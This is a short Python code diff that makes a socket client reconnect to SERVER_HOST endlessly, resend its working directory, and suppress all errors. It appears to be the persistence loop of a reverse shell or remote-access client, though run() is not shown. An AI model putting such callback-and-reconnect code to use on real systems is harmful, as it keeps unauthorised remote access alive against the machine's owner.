@@ -81,4 +81,12 @@ if __name__ == '__main__':
         s = socket.socket()
         s.connect((SERVER_HOST, SERVER_PORT))
         s.send(os.getcwd().encode())
-        run()
+        while True:
+            try:
+                run()
+            except socket.error:
+                s = socket.socket()
+                s.connect((SERVER_HOST, SERVER_PORT))
+                s.send(os.getcwd().encode())
+            except:
+                pass
